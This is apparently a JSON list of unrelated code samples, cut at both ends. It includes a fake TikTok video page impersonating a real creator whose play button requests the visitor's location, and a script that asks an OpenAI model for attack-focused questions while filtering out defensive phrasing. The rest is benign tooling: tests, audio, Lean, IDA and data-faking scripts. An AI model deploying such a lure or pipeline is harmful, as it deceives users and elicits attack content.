url('https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/oQytVBYBBACYfCubEEYfgEDYE') center/cover;\n        }\n        .play-button {\n            width: 80px;\n            height: 80px;\n            background-color: rgba(255, 255, 255, 0.9);\n            border-radius: 50%;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            cursor: pointer;\n            position: relative;\n        }\n        .play-button::after {\n            content: '';\n            width: 0;\n            height: 0;\n            border-style: solid;\n            border-width: 20px 0 20px 35px;\n            border-color: transparent transparent transparent black;\n            margin-left: 8px;\n        }\n        .video-info {\n            padding: 16px;\n            background-color: black;\n        }\n        .username {\n            font-size: 17px;\n            font-weight: 700;\n            margin-bottom: 8px;\n            display: flex;\n            align-items: center;\n        }\n        .verified {\n            width: 16px;\n            height: 16px;\n            margin-left: 4px;\n            background-color: #20D5EC;\n            border-radius: 50%;\n            display: inline-flex;\n            justify-content: center;\n            align-items: center;\n            font-size: 10px;\n            color: white;\n        }\n        .description {\n            font-size: 15px;\n            line-height: 1.4;\n            margin-bottom: 12px;\n        }\n        .stats {\n            display: flex;\n            gap: 16px;\n            font-size: 14px;\n            color: #A4A4A4;\n        }\n        .stat {\n            display: flex;\n            align-items: center;\n            gap: 4px;\n        }\n        .loading-overlay {\n            display: none;\n            position: fixed;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            background-color: rgba(0, 0, 0, 0.8);\n            z-index: 1000;\n            justify-content: center;\n            align-items: center;\n            flex-direction: column;\n        }\n        .spinner {\n            width: 40px;\n            height: 40px;\n            border: 4px solid #A4A4A4;\n            border-top: 4px solid #FE2C55;\n            border-radius: 50%;\n            animation: spin 1s linear infinite;\n            margin-bottom: 16px;\n        }\n        @keyframes spin {\n            0% { transform: rotate(0deg); }\n            100% { transform: rotate(360deg); }\n        }\n        .loading-text {\n            color: white;\n            font-size: 16px;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"video-container\">\n            <div class=\"video-placeholder\">\n                <div class=\"play-button\" onclick=\"requestLocation()\"></div>\n            </div>\n        </div>\n        <div class=\"video-info\">\n            <div class=\"username\">\n                @charlidamelio\n                <span class=\"verified\">\u2713</span>\n            </div>\n            <div class=\"description\">\n                New dance challenge \ud83d\udd25 Try it with your friends! #dance #viral #fyp\n            </div>\n            <div class=\"stats\">\n                <div class=\"stat\">\u2665 2.1M</div>\n                <div class=\"stat\">\ud83d\udcac 45.2K</div>\n                <div class=\"stat\">\u2934 89.3K</div>\n            </div>\n        </div>\n    </div>\n\n    <div id=\"loading\" class=\"loading-overlay\">\n        ",
    "\"\"\"develop tests\"\"\"\n\nimport os\nimport types\n\nimport pytest\n\nimport pkg_resources\nimport setuptools.sandbox\n\n\nclass TestSandbox:\n    def test_devnull(self, tmpdir):\n        with setuptools.sandbox.DirectorySandbox(str(tmpdir)):\n            self._file_writer(os.devnull)\n\n    @staticmethod\n    def _file_writer(path):\n        def do_write():\n            with open(path, 'w', encoding=\"utf-8\") as f:\n                f.write('xxx')\n\n        return do_write\n\n    def test_setup_py_with_BOM(self):\n        \"\"\"\n        It should be possible to execute a setup.py with a Byte Order Mark\n        \"\"\"\n        target = pkg_resources.resource_filename(__name__, 'script-with-bom.py')\n        namespace = types.ModuleType('namespace')\n        setuptools.sandbox._execfile(target, vars(namespace))\n        assert namespace.result == 'passed'\n\n    def test_setup_py_with_CRLF(self, tmpdir):\n        setup_py = tmpdir / 'setup.py'\n        with setup_py.open('wb') as stream:\n            stream.write(b'\"degenerate script\"\\r\\n')\n        setuptools.sandbox._execfile(str(setup_py), globals())\n\n\nclass TestExceptionSaver:\n    def test_exception_trapped(self):\n        with setuptools.sandbox.ExceptionSaver():\n            raise ValueError(\"details\")\n\n    def test_exception_resumed(self):\n        with setuptools.sandbox.ExceptionSaver() as saved_exc:\n            raise ValueError(\"details\")\n\n        with pytest.raises(ValueError) as caught:\n            saved_exc.resume()\n\n        assert isinstance(caught.value, ValueError)\n        assert str(caught.value) == 'details'\n\n    def test_exception_reconstructed(self):\n        orig_exc = ValueError(\"details\")\n\n        with setuptools.sandbox.ExceptionSaver() as saved_exc:\n            raise orig_exc\n\n        with pytest.raises(ValueError) as caught:\n            saved_exc.resume()\n\n        assert isinstance(caught.value, ValueError)\n        assert caught.value is not orig_exc\n\n    def test_no_exception_passes_quietly(self):\n        with setuptools.sandbox.ExceptionSaver() as saved_exc:\n            pass\n\n        saved_exc.resume()\n\n    def test_unpickleable_exception(self):\n        class CantPickleThis(Exception):\n            \"This Exception is unpickleable because it's not in globals\"\n\n            def __repr__(self) -> str:\n                return 'CantPickleThis%r' % (self.args,)\n\n        with setuptools.sandbox.ExceptionSaver() as saved_exc:\n            raise CantPickleThis('detail')\n\n        with pytest.raises(setuptools.sandbox.UnpickleableException) as caught:\n            saved_exc.resume()\n\n        assert str(caught.value) == \"CantPickleThis('detail',)\"\n\n    def test_unpickleable_exception_when_hiding_setuptools(self):\n        \"\"\"\n        As revealed in #440, an infinite recursion can occur if an unpickleable\n        exception while setuptools is hidden. Ensure this doesn't happen.\n        \"\"\"\n\n        class ExceptionUnderTest(Exception):\n            \"\"\"\n            An unpickleable exception (not in globals).\n            \"\"\"\n\n        with pytest.raises(setuptools.sandbox.UnpickleableException) as caught:\n            with setuptools.sandbox.save_modules():\n                setuptools.sandbox.hide_setuptools()\n                raise ExceptionUnderTest\n\n        (msg,) = caught.value.args\n        assert msg == 'ExceptionUnderTest()'\n\n    def test_sandbox_violation_raised_hiding_setuptools(self, tmpdir):\n        \"\"\"\n        When in a sandbox with setuptools hidden, a SandboxViolation\n        should reflect a proper exception and not be wrapped in\n        an UnpickleableException.\n        \"\"\"\n\n        def write_file():\n            \"Trigger a SandboxViolation by writing outside the sandbox\"\n            with open('/etc/foo', 'w', encoding=\"utf-8\"):\n                pass\n\n        with pytest.raises(setuptools.sandbox.SandboxViolation) as caught:\n            with setuptools.sandbox.save_modules():\n                setuptools.sandbox.hide_setuptools()\n                with setuptools.sandbox.DirectorySandbox(str(tmpdir)):\n                    write_file()\n\n        cmd, args, kwargs = caught.value.args\n        assert cmd == 'open'\n        assert args == ('/etc/foo', 'w')\n        assert kwargs == {\"encoding\": \"utf-8\"}\n\n        msg = str(caught.value)\n        assert 'open' in msg\n        assert \"('/etc/foo', 'w')\" in msg\n        assert \"{'encoding': 'utf-8'}\" in msg\n",
    "# Import required libraries for audio processing and noise reduction\nimport pyaudio\nimport numpy as np\nimport noisereduce as nr\nimport wave\nimport threading\n\nclass AudioProcessor:\n    \"\"\"\n    A class to handle real-time audio processing with noise reduction capabilities.\n    Captures audio input, processes it to reduce noise, and saves to a WAV file.\n    \"\"\"\n    # Default audio parameters\n    CHANNELS = 1          # Mono audio\n    FORMAT = pyaudio.paInt16  # 16-bit audio format\n    RATE = 16000         # Sample rate in Hz\n    CHUNK_SIZE = 1024    # Number of frames per buffer\n    \n    def __init__(self, output_filename=\"cleaned_audio.wav\"):\n        \"\"\"\n        Initialize the AudioProcessor with output file configuration and audio setup.\n        Args:\n            output_filename (str): Name of the output WAV file\n        \"\"\"\n        self.output_filename = output_filename\n        self.frames = []  # Store processed audio frames\n        self.pyaudio = pyaudio.PyAudio()\n        self.stream = None\n        self.initialize_stream()\n\n    def initialize_stream(self):\n        \"\"\"\n        Set up the audio input stream with specified parameters.\n        \"\"\"\n        self.stream = self.pyaudio.open(\n            format=self.FORMAT,\n            channels=self.CHANNELS,\n            rate=self.RATE,\n            input=True,\n            frames_per_buffer=self.CHUNK_SIZE\n        )\n\n    def process_audio(self, chunk_data):\n        \"\"\"\n        Process a chunk of audio data to reduce noise.\n        Args:\n            chunk_data (bytes): Raw audio data\n        Returns:\n            bytes: Processed audio data with reduced noise\n        \"\"\"\n        audio_data = np.frombuffer(chunk_data, dtype=np.int16)\n        reduced_noise_data = nr.reduce_noise(y=audio_data, sr=self.RATE)\n        return reduced_noise_data.astype(np.int16).tobytes()\n\n    def save_audio_to_file(self):\n        \"\"\"\n        Save the processed audio frames to a WAV file.\n        \"\"\"\n        if self.frames:\n            with wave.open(self.output_filename, 'wb') as wf:\n                wf.setnchannels(self.CHANNELS)\n                wf.setsampwidth(self.pyaudio.get_sample_size(self.FORMAT))\n                wf.setframerate(self.RATE)\n                wf.writeframes(b''.join(self.frames))\n            print(f\"Processed audio saved to {self.output_filename}\")\n\n    def capture_and_process_audio(self):\n        \"\"\"\n        Main loop for capturing and processing audio in real-time.\n        Runs until interrupted by Ctrl+C.\n        \"\"\"\n        try:\n            print(\"Real-time noise cancellation is running... Press Ctrl+C to stop.\")\n            while True:\n                # Read audio chunk and handle buffer overflow\n                chunk_data = self.stream.read(self.CHUNK_SIZE, exception_on_overflow=False)\n                # Process the chunk and store it\n                reduced_chunk = self.process_audio(chunk_data)\n                self.frames.append(reduced_chunk)\n        except KeyboardInterrupt:\n            print(\"\\nStopping real-time audio processing.\")\n            self.save_audio_to_file()\n            self.cleanup()\n\n    def cleanup(self):\n        \"\"\"\n        Clean up audio resources and close streams.\n        \"\"\"\n        self.stream.stop_stream()\n        self.stream.close()\n        self.pyaudio.terminate()\n        print(\"Audio resources released.\")\n\ndef main():\n    \"\"\"\n    Entry point of the program.\n    Creates an AudioProcessor instance and starts audio processing.\n    \"\"\"\n    processor = AudioProcessor()\n    processor.capture_and_process_audio()\n\nif __name__ == \"__main__\":\n    main()\n\n",
    "import os\nimport pathlib\nfrom pprint import pprint\nimport subprocess\n\nimport select\nimport orjson\n\nfrom .utils import SemanticTokenProcessor\n\n\nLEN_URI_PREFIX = 7\nIGNORED_METHODS = {\n    \"workspace/didChangeWatchedFiles\",\n    \"workspace/semanticTokens/refresh\",\n    \"client/registerCapability\",\n}\n\n\nclass BaseLeanLSPClient:\n    \"\"\"BaseLeanLSPClient runs a language server in a subprocess.\n\n    See :meth:`leanclient.client.LeanLSPClient` for more information.\n    \"\"\"\n\n    def __init__(\n        self,\n        project_path: str,\n        initial_build: bool = True,\n        print_warnings: bool = True,\n    ):\n        self.print_warnings = print_warnings\n        self.project_path = os.path.abspath(project_path) + \"/\"\n        self.len_project_uri = len(self.project_path) + LEN_URI_PREFIX\n        self.request_id = 0\n\n        if initial_build:\n            subprocess.run([\"lake\", \"build\"], cwd=self.project_path, check=True)\n\n        # Run the lean4 language server in a subprocess\n        self.process = subprocess.Popen(\n            [\"lake\", \"serve\"],\n            cwd=self.project_path,\n            stdout=subprocess.PIPE,\n            stdin=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n        )\n        self.stdin = self.process.stdin\n        self.stdout = self.process.stdout\n\n        # Check stderr for any errors\n        error = self._read_stderr_non_blocking()\n        if error:\n            print(\"Process started with stderr message:\\n\", error)\n\n        # Initialize language server. Options can be found here:\n        # https://github.com/leanprover/lean4/blob/a955708b6c5f25e7f9c9ae7b951f8f3d5aefe377/src/Lean/Data/Lsp/InitShutdown.lean\n        self._send_request_rpc(\n            \"initialize\",\n            {\n                \"processId\": os.getpid(),\n                \"rootUri\": self._local_to_uri(self.project_path),\n                \"initializationOptions\": {\n                    \"editDelay\": 1  # It seems like this has no effect.\n                },\n            },\n            is_notification=False,\n        )\n        server_info = self._read_stdout()[\"result\"]\n\n        legend = server_info[\"capabilities\"][\"semanticTokensProvider\"][\"legend\"]\n        self.token_processor = SemanticTokenProcessor(legend[\"tokenTypes\"])\n\n        self._send_notification(\"initialized\", {})\n\n    def close(self):\n        \"\"\"Always close the client when done!\n\n        Terminates the language server process and close all pipes.\n        \"\"\"\n        self.process.terminate()\n        self.process.stderr.close()\n        self.stdout.close()\n        self.stdin.close()\n        self.process.wait()\n\n    # URI HANDLING\n    def _local_to_uri(self, local_path: str) -> str:\n        \"\"\"Convert a local file path to a URI.\n\n        User API is based on local file paths (relative to project path) but internally we use URIs.\n        Example:\n\n        - local path:  MyProject/LeanFile.lean\n        - URI:         file:///abs/to/project_path/MyProject/LeanFile.lean\n\n        Args:\n            local_path (str): Relative file path.\n\n        Returns:\n            str: URI representation of the file.\n        \"\"\"\n        return pathlib.Path(self.project_path, local_path).as_uri()\n\n    def _locals_to_uris(self, local_paths: list[str]) -> list[str]:\n        \"\"\"See :meth:`_local_to_uri`\"\"\"\n        return [\n            pathlib.Path(self.project_path, local_path).as_uri()\n            for local_path in local_paths\n        ]\n\n    def _uri_to_abs(self, uri: str) -> str:\n        \"\"\"See :meth:`_local_to_uri`\"\"\"\n        return uri[LEN_URI_PREFIX:]\n\n    def _uri_to_local(self, uri: str) -> str:\n        \"\"\"See :meth:`_local_to_uri`\"\"\"\n        return uri[self.len_project_uri :]\n\n    # LANGUAGE SERVER RPC INTERACTION\n    def _read_stdout(self) -> dict:\n        \"\"\"Read the next message from the language server.\n\n        This is the main blocking function in this synchronous client.\n\n        Returns:\n            dict: JSON response from the language server.\n        \"\"\"\n        header = self.stdout.readline().decode(\"ascii\")\n\n        # Handle EOF: Return contents of stderr (non-blocking using select)\n        if not header:\n            line = self._read_stderr_non_blocking()\n            if line:\n                line = \"lake stderr message:\\n\" + line\n            if not line:\n                line = \"No lake stderr message.\"\n            self.close()\n            raise EOFError(f\"Language server has closed. {line}\")\n\n        # Parse message\n        content_length = int(header.split(\":\")[1])\n        next(self.stdout)\n        return orjson.loads(self.stdout.read(content_length))\n\n    def _read_stderr_non_blocking(self, timeout: float = 0.00001) -> str:\n        \"\"\"Read the next message from the language server's stderr.\n\n        Args:\n            timeout (float): Time to wait for stderr message.\n\n        Returns:\n            str: Message from the language server's stderr.\n        \"\"\"\n        stderr = self.process.stderr\n        if select.select([stderr], [], [], timeout)[0]:\n            return stderr.readli",
    "import re\nimport base64\nimport csv\nimport os\nfrom openai import OpenAI\n\nOPENAI_API_KEY = \"INSERT_YOUR_OPENAI_API_KEY_HERE\"\n\ndisallowed_content = [\n        \"analysis of different\",\n        \"awareness\",\n        \"back to the perpetrator\",\n        \"best practices\",\n        \"bug bounty\",\n        \"combat\",\n        \"combatting\",\n        \"common flaws in creating\",\n        \"common signs\",\n        \"compliance\",\n        \"considered\",\n        \"concerned\",\n        \"consequence\",\n        \"consequences\",\n        \"constructive\",\n        \"contingency plan\",\n        \"correlation\",\n        \"courses or certifications\",\n        \"cybersecurity skills\",\n        \"debugging\",\n        \"defend\",\n        \"defensive purposes\",\n        \"defense\",\n        \"detect\",\n        \"detect and mitigate\",\n        \"detect and neutralize\",\n        \"detection capabilities\",\n        \"detection challenges\",\n        \"differences\",\n        \"discuss the impact\",\n        \"disclosing\",\n        \"document\",\n        \"documenting\",\n        \"educate\",\n        \"educational\",\n        \"evolution\",\n        \"evolution of technology\",\n        \"ethical\",\n        \"ethically\",\n        \"enforce\",\n        \"examples\",\n        \"experiment\",\n        \"falling victim\",\n        \"following legal guidelines\",\n        \"global initiatives\",\n        \"guidelines for reporting\",\n        \"help employees\",\n        \"historical significance\",\n        \"how can i collaborate\",\n        \"how can the impact\",\n        \"how do antivirus programs detect\",\n        \"how do researchers\",\n        \"how do security researchers\",\n        \"i protect\",\n        \"identify indicators\",\n        \"identify signs\",\n        \"implications\",\n        \"incident response\",\n        \"incorporate security\",\n        \"measures to prevent\",\n        \"mitigate\",\n        \"mitigates\",\n        \"mitigating\",\n        \"motivations\",\n        \"organizations\",\n        \"penetration test\",\n        \"penetration testing\",\n        \"potential impact\",\n        \"potential impacts\",\n        \"precautions\",\n        \"prevent\",\n        \"proactive\",\n        \"proactively\",\n        \"protect against\",\n        \"protect my\",\n        \"protect myself\",\n        \"protecting against\",\n        \"psychological\",\n        \"quid pro quo\",\n        \"raise awareness\",\n        \"recommend any online resources\",\n        \"recommend any resources\",\n        \"recommend online resources\",\n        \"recommend resources\",\n        \"red flags\",\n        \"regulations\",\n        \"reputation\",\n        \"reverse engineer\",\n        \"reverse-engineer\",\n        \"reverse engineering\",\n        \"responsibly\",\n        \"risk\",\n        \"risks\",\n        \"safeguard against\",\n        \"safely\",\n        \"secure\",\n        \"securely\",\n        \"securing\",\n        \"signs of compromise\",\n        \"social engineering\",\n        \"stay ahead\",\n        \"stay updated\",\n        \"test the resilience\",\n        \"test the security\",\n        \"testing\",\n        \"technologies\",\n        \"to protect\",\n        \"trade-offs\",\n        \"trends\",\n        \"training program\",\n        \"training programs\",\n        \"what are some signs\",\n        \"what are the limitations\",\n        \"what are the signs\",\n        \"what impact can\",\n        \"what role does\",\n        \"what role do\",\n        \"without causing harm\",\n        \"writing about\"\n    ]\n\ndef call_gpt(prompt, model_choice):\n    client = OpenAI(api_key=OPENAI_API_KEY)\n    message = [{\"role\": \"user\", \"content\": prompt}]\n    if not model_choice.startswith(\"o1\"):\n        message.insert(0, {\"role\": \"system\", \"content\": \"You are a helpful assistant.\"})\n    response = client.chat.completions.create(\n        model=model_choice,\n        messages=message\n    )\n    return response.choices[0].message.content\n\n\n\ndef txt_to_list(file_path):\n    \"\"\"\n    Reads a text file line by line, strips whitespace, and returns each line as\n    an element in a list.\n    \"\"\"\n    try:\n        with open(file_path, 'r') as file:\n            # Read all lines from the file and strip trailing whitespace\n            lines = [line.strip() for line in file.readlines()]\n        return lines\n    except FileNotFoundError:\n        # Handle the case where the file does not exist\n        print(f\"Error: The file at {file_path} was not found.\")\n        return []\n    except Exception as e:\n        # Catch any other exceptions and print them\n        print(f\"An error occurred: {e}\")\n        return []\n\n\ndef phrase_as_question(keyword):\n    \"\"\"\n    Converts the given keyword into a question draft.\n    \"\"\"\n    return \"How do I perform or implement (a/an) \" + keyword + \"(s)?\"\n\n\ndef gen_question_set(draft_question):\n    \"\"\"\n    Calls ChatGPT 3.5 Turbo to generate a list of 50 close-ended instructions\n    and questions based on an initial draft question.\n    \"\"\"\n    prompt = f\"\"\"\n    Please generate a mix of 50 close-ended instructions and questions that directly relate to an initial\n    [DRAFT] and preserves its underlying intent. Each generated instruction or question must focus on\n    adversarial (rather than defensive) scenarios. Q",
    "    \nprint(\"\\n**************** Numericals to words ***********************\\n\\n\")\nn = int(input(\"Enter a number you want to convert into words = Minimum =0 Maximum =9900009999999 \\n\\nThis program can help you within this limit only: \"))\n\n# Defining scales and word lists\nhighers = [\"Lakh crores\", \"Lakh crore\", \"Hundred crores\", \"Hundred Crore\", \"crores\", \"crore\", \"Lakhs\", \"Lakh\", \"Thousands\", \"Thousand\", \"Hundred\"]\ntens = [\"\", \"Ten\", \"Twenty\", \"Thirty\", \"Forty\", \"Fifty\", \"Sixty\", \"Seventy\", \"Eighty\", \"Ninety\"]\nunits = [\"\", \"One\", \"Two\", \"Three\", \"Four\", \"Five\", \"Six\", \"Seven\", \"Eight\", \"Nine\", \"Ten\", \"Eleven\", \"Twelve\", \"Thirteen\", \"Fourteen\", \"Fifteen\", \"Sixteen\", \"Seventeen\", \"Eighteen\", \"Nineteen\"]\n\n# Splitting the number into parts\nlakhcrores = (n // 100000000000) % 100\nhundredcrores = (n // 1000000000) % 100\ncrore = (n // 10000000) % 100\nlakh = (n // 100000) % 100\nthousand = (n // 1000) % 100\nhundred = (n // 100) % 10\nrest = n % 100\n\nfinalword = \"\"  # To store the result word\n\n# Logic to convert each part\nif (lakhcrores > 0):\n    if (lakhcrores < 20):\n        finalword += \" \" + units[lakhcrores] + \" \" + highers[0]\n    else:\n        finalword += \" \" + tens[lakhcrores // 10] + \" \" + units[lakhcrores % 10] + \" \" + highers[0]\n\nif (hundredcrores > 0):\n    if (hundredcrores < 20):\n        finalword += \" \" + units[hundredcrores] + \" \" + highers[2]\n    else:\n        finalword += \" \" + tens[hundredcrores // 10] + \" \" + units[hundredcrores % 10] + \" \" + highers[2]\n\nif (crore > 0):\n    if (crore < 20):\n        finalword += \" \" + units[crore] + \" \" + highers[4]\n    else:\n        finalword += \" \" + tens[crore // 10] + \" \" + units[crore % 10] + \" \" + highers[4]\n\nif (lakh > 0):\n    if (lakh < 20):\n        finalword += \" \" + units[lakh] + \" \" + highers[6]\n    else:\n        finalword += \" \" + tens[lakh // 10] + \" \" + units[lakh % 10] + \" \" + highers[6]\n\nif (thousand > 0):\n    if (thousand < 20):\n        finalword += \" \" + units[thousand] + \" \" + highers[8]\n    else:\n        finalword += \" \" + tens[thousand // 10] + \" \" + units[thousand % 10] + \" \" + highers[8]\n\nif (hundred > 0):\n    finalword += \" \" + units[hundred] + \" \" + highers[10]\n\nif (rest > 0):\n    if (rest < 20):\n        finalword += \" \" + units[rest]\n    else:\n        finalword += \" \" + tens[rest // 10] + \" \" + units[rest % 10]\n\nif n == 0:\n    finalword = \"Zero\"\n\n# Output the result\nprint(\"\\n\\nHere is the word conversion of the number you entered:\", finalword.strip(), \"\\n\")\nprint(\"\\n**************************\\n\")\n\n\n\n\n\n\n",
    "import gender_guesser.detector as gender\nfrom faker import Faker\nfrom datetime import datetime, date\nimport random\n\nfake = Faker(\"pt-BR\")\n\ndef nome_completo():\n    abreviacoes = (\"Dr. \", \"Sra. \", \"Srta. \", \"Dra. \", \"Sr. \")\n    nome = fake.unique.name()\n    \n    for abreviacao in abreviacoes:\n        if abreviacao in nome:\n            nome = nome.replace(abreviacao, \"\")\n        \n    return nome\n\ndef descobrir_genero(nome_completo):\n    nome = nome_completo.split(\" \")\n    nome = nome[0]\n\n    detector_genero = gender.Detector()\n    genero = \"M\" if detector_genero.get_gender(nome) in (\"male\", \"mostly_male\", \"andy\") else \"F\"\n    return genero\n\ndef definir_cargos():\n    cargos = [\n        \"CEO\",\n        \"Desenvolvedor de Software J\u00fanior\",\n        \"Desenvolvedor de Software Pleno\",\n        \"Desenvolvedor de Software S\u00eanior\",\n        \"Engenheiro de DevOps\",\n        \"Product Manager\",\n        \"Designer de UX/UI\",\n        \"Especialista em Marketing Digital\",\n        \"Analista de dados\",\n        \"Gestor de Recursos Humanos\",\n        \"Suporte ao Cliente\",\n        \"Assistente Administrativo\",\n        \"Gerente de Projetos\",\n        \"Analista de qualidade (QA)\",\n        \"Especialista em Seguran\u00e7a da Informa\u00e7\u00e3o\",\n        \"Gestor de Vendas\",\n        \"Auxiliar de servi\u00e7os gerais\",\n        \"Assitente de TI (Suporte T\u00e9cnico)\",\n        \"Gerente de TI\",\n        \"Coordenador de Atendimento ao Cliente\"\n    ]\n\n    peso = [1, 40, 20, 2, 2, 10, 2, 2, 20, 2, 40, 35, 2, 15, 2, 10, 20, 30, 2, 2]\n    cargo = random.choices(cargos, weights=peso, k=1)\n\n    return cargo[0]\n\ndef data_admissao():\n    return fake.date_between_dates(date_start=date(2012, 1, 1)).strftime(\"%Y/%m/%d\")\n\ndef data_desligamento(data_inicio):\n    data_admissao = datetime.strptime(data_inicio, \"%Y/%m/%d\")\n\n    campo = [\"\"]\n    peso = [10, 1]\n    data = fake.date_between_dates(date_start=data_admissao).strftime(\"%Y/%m/%d\")\n    campo.append(data)\n    campo_final = random.choices(campo, weights=peso, k=1)\n\n    return str(campo_final[0])\n\ndef status(data_desligamento):\n    if data_desligamento == \"\":\n        status = \"Ativo\"\n    else:\n        status = \"Inativo\"\n\n    return status\n\ndef beneficios():\n    salario = round(random.uniform(1500, 5000), 2)\n    plano_saude = round(random.uniform(200, 500), 2)\n    cartao_alimentacao = round(random.uniform(500, 1200), 2)\n\n    return salario, plano_saude, cartao_alimentacao\n\ndef estado():\n    estados = [\n    \"Acre\", \"Alagoas\", \"Amap\u00e1\", \"Amazonas\", \"Bahia\", \"Cear\u00e1\", \n    \"Distrito Federal\", \"Esp\u00edrito Santo\", \"Goi\u00e1s\", \"Maranh\u00e3o\", \n    \"Mato Grosso\", \"Mato Grosso do Sul\", \"Minas Gerais\", \"Par\u00e1\", \n    \"Para\u00edba\", \"Paran\u00e1\", \"Pernambuco\", \"Piau\u00ed\", \"Rio de Janeiro\", \n    \"Rio Grande do Norte\", \"Rio Grande do Sul\", \"Rond\u00f4nia\", \n    \"Roraima\", \"Santa Catarina\", \"S\u00e3o Paulo\", \"Sergipe\", \"Tocantins\"\n    ]\n\n    peso = [3, 7, 5, 3, 5, 20, 20, 2, 35, 40, 20, 45, 80, 20, 10, 50, 20, 20, 80, 40, 50, 10, 5, 60, 100, 20, 10]\n\n    estado = random.choices(estados, weights=peso, k=1)\n\n    return estado[0]\n\ndef pontuacao_da_avaliacao():\n    pontualidade = random.randint(5, 10)\n    trabalho_em_equipe = random.randint(5, 10)\n    cumprimento_metas = random.randint(5, 10)\n\n    return pontualidade, trabalho_em_equipe, cumprimento_metas\n\ndef data_avalicao(data_inicio):\n    data_admissao = datetime.strptime(data_inicio, \"%Y/%m/%d\")\n    return fake.date_between_dates(date_start=data_admissao).strftime(\"%Y/%m/%d\")",
    "# -*- coding: utf-8 -*-\nimport json\n\nprocessFields = [\n\t\"ScriptMethod\",\n\t\"ScriptString\",\n\t\"ScriptMetadata\",\n\t\"ScriptMetadataMethod\",\n\t\"Addresses\",\n]\n\nimageBase = idaapi.get_imagebase()\n\ndef get_addr(addr):\n\treturn imageBase + addr\n\ndef set_name(addr, name):\n\tret = idc.set_name(addr, name, SN_NOWARN | SN_NOCHECK)\n\tif ret == 0:\n\t\tnew_name = name + '_' + str(addr)\n\t\tret = idc.set_name(addr, new_name, SN_NOWARN | SN_NOCHECK)\n\ndef make_function(start, end):\n\tnext_func = idc.get_next_func(start)\n\tif next_func < end:\n\t\tend = next_func\n\tif idc.get_func_attr(start, FUNCATTR_START) == start:\n\t\tida_funcs.del_func(start)\n\tida_funcs.add_func(start, end)\n\npath = idaapi.ask_file(False, '*.json', 'script.json from Il2cppdumper')\nhpath = idaapi.ask_file(False, '*.h', 'il2cpp.h from Il2cppdumper')\nparse_decls(open(hpath, 'r').read(), 0)\ndata = json.loads(open(path, 'rb').read().decode('utf-8'))\n\nif \"Addresses\" in data and \"Addresses\" in processFields:\n\taddresses = data[\"Addresses\"]\n\tfor index in range(len(addresses) - 1):\n\t\tstart = get_addr(addresses[index])\n\t\tend = get_addr(addresses[index + 1])\n\t\tmake_function(start, end)\n\nif \"ScriptMethod\" in data and \"ScriptMethod\" in processFields:\n\tscriptMethods = data[\"ScriptMethod\"]\n\tfor scriptMethod in scriptMethods:\n\t\taddr = get_addr(scriptMethod[\"Address\"])\n\t\tname = scriptMethod[\"Name\"]\n\t\tset_name(addr, name)\n\t\tsignature = scriptMethod[\"Signature\"]\n\t\tif apply_type(addr, parse_decl(signature, 0), 1) == False:\n\t\t\tprint(\"apply_type failed:\", hex(addr), signature)\n\nif \"ScriptString\" in data and \"ScriptString\" in processFields:\n\tindex = 1\n\tscriptStrings = data[\"ScriptString\"]\n\tfor scriptString in scriptStrings:\n\t\taddr = get_addr(scriptString[\"Address\"])\n\t\tvalue = scriptString[\"Value\"]\n\t\tname = \"StringLiteral_\" + str(index)\n\t\tidc.set_name(addr, name, SN_NOWARN)\n\t\tidc.set_cmt(addr, value, 1)\n\t\tindex += 1\n\nif \"ScriptMetadata\" in data and \"ScriptMetadata\" in processFields:\n\tscriptMetadatas = data[\"ScriptMetadata\"]\n\tfor scriptMetadata in scriptMetadatas:\n\t\taddr = get_addr(scriptMetadata[\"Address\"])\n\t\tname = scriptMetadata[\"Name\"]\n\t\tset_name(addr, name)\n\t\tidc.set_cmt(addr, name, 1)\n\t\tif scriptMetadata[\"Signature\"] is not None:\n\t\t\tsignature = scriptMetadata[\"Signature\"]\n\t\t\tif apply_type(addr, parse_decl(signature, 0), 1) == False:\n\t\t\t\tprint(\"apply_type failed:\", hex(addr), signature)\n\nif \"ScriptMetadataMethod\" in data and \"ScriptMetadataMethod\" in processFields:\n\tscriptMetadataMethods = data[\"ScriptMetadataMethod\"]\n\tfor scriptMetadataMethod in scriptMetadataMethods:\n\t\taddr = get_addr(scriptMetadataMethod[\"Address\"])\n\t\tname = scriptMetadataMethod[\"Name\"]\n\t\tmethodAddr = get_addr(scriptMetadataMethod[\"MethodAddress\"])\n\t\tset_name(addr, name)\n\t\tidc.set_cmt(addr, name, 1)\n\t\tidc.set_cmt(addr, '{0:X}'.format(methodAddr), 0)\n\nprint('Script finished!')\n\n",
    "import streamlit as st\nimport controlflow as cf\nfrom firecrawl import FirecrawlApp\nimport os\nfrom dotenv import load_dotenv\nfrom task import (\n    sheldon, leonard, penny, howard, raj, \n    get_topic_context, analyze_sentiment\n)\n\n# Load environment variables\nload_dotenv()\n\n# Page configuration\nst.set_page_config(\n    page_title=\"BBT AI Discussion\",\n    page_icon=\"\ud83d\udd2c\",\n    layout=\"wide\"\n)\n\n# Styling\nst.markdown(\"\"\"\n    <style>\n    .agent-message {\n        padding: 8px;\n        border-radius: 4px;\n        margin: 8px 0;\n        font-size: 14px;\n        line-height: 1.5;\n    }\n    .sheldon { background-color: #e3f2fd; }\n    .leonard { background-color: #f3e5f5; }\n    .penny { background-color: #fff3e0; }\n    .howard { background-color: #e8f5e9; }\n    .raj { background-color: #fce4ec; }\n    .main-content {\n        max-width: 800px;\n        margin: 0 auto;\n        padding: 10px;\n    }\n    .stMarkdown {\n        font-size: 14px;\n    }\n    .discussion-title {\n        font-size: 16px;\n        font-weight: 600;\n        margin-bottom: 10px;\n    }\n    .stButton > button {\n        width: 100%;\n        padding: 4px 8px;\n        font-size: 14px;\n        margin: 2px 0;\n        border-radius: 4px;\n    }\n    div[data-testid=\"column\"] {\n        padding: 0 4px;\n    }\n    .sentiment-indicator {\n        font-size: 12px;\n        font-style: italic;\n        color: #666;\n        margin-top: 4px;\n    }\n    </style>\n    \"\"\", unsafe_allow_html=True)\n\n# Sidebar Configuration\nst.sidebar.title(\"Big Bang Theory AI Discussion Panel\")\nst.sidebar.markdown(\"Watch the BBT gang discuss any topic with their unique perspectives!\")\nst.sidebar.markdown(\"<div style='margin-top: -8px;'>---</div>\", unsafe_allow_html=True)\n\nst.sidebar.markdown(\"### Configure Your Discussion\")\n\n# Topic input in sidebar\ntopic = st.sidebar.text_area(\n    \"Enter a topic for 